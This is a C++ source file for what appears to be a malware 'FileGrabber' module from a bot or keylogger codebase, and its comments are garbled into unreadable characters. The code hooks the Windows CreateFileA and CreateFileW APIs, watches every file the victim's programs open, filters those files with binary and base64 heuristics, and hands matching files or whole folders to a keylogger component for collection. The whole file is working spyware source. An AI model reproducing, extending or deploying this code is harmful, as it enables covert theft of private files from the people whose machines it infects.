#include "UniversalKeyLogger.h"
#include "FileGrabber.h"
#include "Memory.h"
#include "String.h"
#include "GetApi.h"
#include "Utils.h"
#include "Splice.h"
#include "Unhook.h"

#include "BotDebug.h"

namespace FILEGRABBERDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define DBG FILEGRABBERDEBUGSTRINGS::DBGOutMessage<>

namespace FileGrabber {

TypeCreateFileW Real_CreateFileW;
TypeCreateFileA Real_CreateFileA;

PList receivers = 0; //����������
DWORD PID = 0; //��� �������������� ��������� �������������
int stateGrabber = 0; //��������� ��������

bool IsBin( BYTE* data, int szData )
{
	//������� ������� ��������
	int s[256];
	m_memset(s, 0, sizeof(s));

	for( int i = 0; i < szData; i++ ) s[data[i]]++;

	//������� ������� �������
	int avg = szData / 256;
	//������ � ����� ��������� ���������� �������������� ������
	int min = avg - avg / 2 - 1; if( min <= 0 ) min = 1;
	int max = avg + avg / 2 + 1;
	//������������ ���������� ��������� ������ � ��������� [m1;m2]
   	int m1 = 0, m2 = 0;
	for( int i = 0; i < 256; i++ )
		if( s[i] )
			if( min <= s[i] && s[i] <= max )
				m1++;
			else
				m2++;
	//���� ������� ���������� ������������, �� ���������� ���������
	//������ ���� �������� �� 25% ������
	if( m1 * 75 / 100 > m2 )
		return true;
	return false;
}

//��������� �������� �� ������ ���������� base64
bool IsBase64( BYTE* data, int szData )
{
	int sz = 0; //���������� �������� � data, ����������� ������� �����
	int max = 0; //������������ ����� ������������������ �������� ��������� base64
	int len = 0; //������� ������� ��������
	int rows = 0; //���������� �����
	for( int i = 0; i < szData; i++ )
	{
		char c = data[i];
		if( c != 13 && c != 10 ) 
		{
			if( (c >= 'A' && c <= 'Z') ||
				(c >= 'a' && c <= 'z') ||
				(c >= '0' && c <= '9') ||
				c == '+' || c == '/' || c == '=' ) len++;
			else
				if( len > max )
					max = len;
				else
					len = 0;
			sz++;
		}
		else
			rows++;

	}
	if( len * 100 / sz > 70 && rows > 0 ) //����������� ������ ��� ��������� base64, � ����� ���� ������� �� ������
		return true;
	return false;
}

//��������� ������� ���������� � �������� �� ���������� � ������������ ����, �������� �������� ����������
void SendEvent( ParamEvent& e )
{
	if( !receivers )
		return;
	int count = List::Count(receivers);
	for( int i = 0; i < count; i++ )
	{
		Receiver* rv = (Receiver*)List::GetItem( receivers, i );
		if( e.access & rv->access ) //��� �������
		{
			DWORD h;
 			e.szData = (DWORD)pGetFileSize( e.file, &h );
			//�������� �� ������
			if( e.szData >= rv->minSize && (e.szData <= rv->maxSize || rv->maxSize < 0))
			{
				bool send = true; //����� ������� ��� ���
				
				//��������� ����
				if( rv->maska || rv->aw & (LOADFILE | FILEISBIN) || rv->ignoreBeg[0][0] )
				{
					e.data = (BYTE*)MemAlloc(e.szData + 1); //�� 1 ������ ��� ��������� ����, ����� ����� ��������� ����� �� �����
					if( e.data ) 
					{
						DWORD size = 0;
						pReadFile( e.file, e.data, e.szData, &size, NULL ); //������ ���� ���� � ������
						pSetFilePointer( e.file, 0, 0, FILE_BEGIN );
						if( size == e.szData ) //������������� ��� ������
						{
							((char*)e.data)[e.szData] = 0; //���� ������������ ��� ������

							//���������� ����� ��������� ��������
							int n = 0;
							while( rv->ignoreBeg[n][0] && send && n < MaxIgnoreBeg )
							{
								for( int i = 0; i <= MaxLenIgnoreBeg; i++ )
								{
									if( i == MaxLenIgnoreBeg || (rv->ignoreBeg[n][i] == 0 && i > 0) ) //������ �������
									{
										send = false;
										break;
									}
									if( rv->ignoreBeg[n][i] != e.data[i] )
										break;
								}
								n++;
							}
						}
						else
							send = false;
						
						if( send )
						{
							//���� ���� �����-�� �� ��������, �� �������� ������ ����� ����� ���� ������� �� ���� �� ���
							bool filters = false; //�������� �� ����� �����-�� �������
							for(;;)
							{
								//��������� �����
								if( rv->maska )
								{
									filters = true;
									send = WildCmp( (char*)e.data, rv->maska );
									if( send ) break;
								}
	
								if( rv->aw & FILEISBIN )
								{
									filters = true;
									send = IsBin( (BYTE*)e.data, e.szData );
									if( send ) break;
								}

								if( rv->aw & FILEISBASE64 )
								{
									filters = true;
									send = IsBase64( (BYTE*)e.data, e.szData );
									if( send ) break;
								}
								if( filters ) send = false; //���� �� ���� �� �������� �� ��������, �� ��������� �� ����
								break;
							}
						}
					}
					else
						send = false;
				}
				if( rv->FuncReceiver && send )
				{
					e.nameSend[0] = 0;
					if( e.unicode )
					{
						DBG("FileGrabberW", "������������� �� ���� '%ls', size: %d", e.fileNameW, e.szData );
						e.fileName = WSTR::ToAnsi( e.fileNameW, 0 );
					}
					else
					{
						DBG("FileGrabberA", "������������� �� ���� '%s', size: %d", e.fileNameA, e.szData );
						e.fileName = (char*)e.fileNameA;
					}

					e.shortName = File::ExtractFileNameA( e.fileName, false );
					//���� ����������
					e.extFile = 0;
					const char* p = STR::End((char*)e.shortName); 
					while( p >= e.shortName )
						if( *p == '.' )
						{
							e.extFile = p + 1; 
							break;
						}
						else
							p--;

					int res = rv->FuncReceiver(&e);
					if( res & SENDFILE ) //���� ���������� SENDFILE, �� ���������� ����������
					{
						if( e.data )
						{
							const char* nameSend = "FileGrabber";
							if( res & CURRNAMEFILE ) //��������� ��� �� ������� ����� �����
								nameSend = e.shortName;
							else
								if( res & CURRFULLNAMEFILE ) //��� ����� � ������� ������
									nameSend = e.fileName;
								else
									if( e.nameSend[0] ) //��� ������� ����������
										nameSend = e.nameSend;
							if( e.unicode )
								DBG("FileGrabberW", "��������� ���� '%ls' ��� ������ '%s'", e.fileNameW, nameSend );
							else
								DBG("FileGrabberA", "��������� ���� '%s' ��� ������ '%s'", e.fileNameA, nameSend );
							KeyLogger::AddFile( 0, (char*)nameSend, e.data, e.szData );
						}
					}
					else 
						if( res & SENDFOLDER )
						{
							pPathRemoveFileSpecA(e.fileName);
							//��������� � ����� ����, ��� ������� PathRemoveFileSpec ��� �������
							int sz = m_lstrlen(e.fileName);
							e.fileName[sz] = '\\';
							e.fileName[sz + 1] = 0;
							DBG( "FileGrabber", "���������� ����� '%s' ��� ������ '%s'", e.fileName, e.nameSend );
							int currState = stateGrabber;
							stateGrabber |= IGNOREHOOK; //��������� �������
							KeyLogger::AddDirectory( e.fileName, e.nameSend );
							stateGrabber = currState; //��������������� ���������
						}
					if( e.fileName != e.fileNameA ) //����������� ������, ���� ���� �������������
						STR::Free(e.fileName);
				}
				MemFree(e.data);
			}
		}
	}
}

HANDLE WINAPI Hook_CreateFileA( LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	HANDLE File = Real_CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
	if( (stateGrabber & IGNOREHOOK) == 0 && (dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED) == 0 && lpFileName && lpFileName[0] != '/' && lpFileName[0] != '\\' ) //���������� �������� ������ ������
	{
	//DBG("FileGrabberA", "%s", lpFileName);
		//������������� ���������� �������
		ParamEvent e;
		e.data = 0;
		e.szData = 0;
		m_lstrcpy( e.fileNameA, lpFileName );
		e.unicode = false;
		e.access = dwDesiredAccess;
		e.file = File;
		SendEvent(e); //�������� �������
	}
	return File;
}

HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	HANDLE File = Real_CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
	if( (stateGrabber & IGNOREHOOK) == 0 && (dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED) == 0 && lpFileName && lpFileName[0] != '/' && lpFileName[0] != '\\' ) //���������� �������� ������ ������
	{
	//DBG("FileGrabberW", "%ls", lpFileName);
		//������������� ���������� �������
		ParamEvent e;
		e.data = 0;
		e.szData = 0;
		int len = m_wcslen(lpFileName);
		m_memcpy( e.fileNameW, lpFileName, sizeof(WCHAR) * (len + 1) );
		e.unicode = true;
		e.access = dwDesiredAccess;
		e.file = File;
		SendEvent(e); //�������� �������
		//DBG( "FileGrabberW", "- %ls, %ls", lpFileName, e.fileNameW );
		/*
		if( !m_wcsncmp( (WCHAR*)lpFileName, e.fileNameW, len ) )
		{
			DBG( "FileGrabberW", "%ls != %ls", lpFileName, e.fileNameW );
			m_memcpy( (void*)lpFileName, e.fileNameW, sizeof(WCHAR) * (len + 1) );
		}
		*/
	}
	return File;
}

//�������� ���������� ��� ����������� ������
void DelReceiver(void* p)
{
	MemFree(p);
}

bool Init( int flags )
{
	if( !IsNewProcess(PID) ) //� ��� �� ��������, ������������� ��� ����
		return true; //������������� ��� ����, ������� �������, ��� ������������� ��������
	receivers = List::Create();
	if( !receivers )
		return false;
	List::SetFreeItemMehod( receivers, DelReceiver ); //��� ��������������� �������� �����������
	if( flags & CREATEFILEA )
	{
		if (!HookApi(1, Hash_CreateFileA, &Hook_CreateFileA, &Real_CreateFileA ) )
			return false;
	}
	if( flags & CREATEFILEW )
	{
		if (!HookApi(1, Hash_CreateFileW, &Hook_CreateFileW, &Real_CreateFileW ) )
			return false;
	}
	stateGrabber = 0;
	return true;
}

void Release()
{
	UnhookCreateFile();
	List::Free(receivers);
	receivers = 0;
	PID = 0;
	stateGrabber = 0;
}

Receiver* CreateReceiver()
{
	Receiver* ret = (Receiver*)MemAlloc( sizeof(Receiver) );
	ret->access = GENERIC_READ;
	ret->aw = CREATEFILEA | CREATEFILEW;
	return ret;
}

bool AddReceiver( Receiver* rv )
{
	if( receivers )
	{
		List::Add( receivers, rv );
		return true;
	}
	return false;
}

 //��������� ������������ ������� ������, ������� ����������� � ������ �����
bool AddIgnoreBeg( Receiver* rv, const char* beg )
{
	for( int i = 0; i < MaxIgnoreBeg; i++ )
		if( rv->ignoreBeg[i][0] == 0 )
		{
			int j;
			for( j = 0; j < MaxLenIgnoreBeg && beg[j]; j++ )
				rv->ignoreBeg[i][j] = beg[j];
			//������� �������� ������
			for( ; j < MaxLenIgnoreBeg; j++ )
				rv->ignoreBeg[i][j] = 0;
			return true;
		}
	return false;
}

};

